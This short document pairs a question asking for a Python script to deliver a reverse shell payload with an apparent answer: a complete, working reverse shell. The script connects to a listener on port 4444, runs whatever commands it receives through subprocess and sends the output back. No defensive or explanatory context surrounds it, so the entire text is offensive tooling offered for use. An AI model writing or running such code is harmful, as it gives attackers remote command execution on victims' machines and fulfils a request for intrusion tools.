#Question: Write a Python script to deliver a reverse shell payload to the server



import socket
import os
import subprocess

def reverse_shell():
    server_ip = '0.0.0.0'
    server_port = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    while True:
        
        command = s.recv(1024).decode('utf-8')

        if command.lower() == 'exit':
            break

        output = subprocess.getoutput(command)

        s.send(output.encode('utf-8'))

    s.close()

reverse_shell()
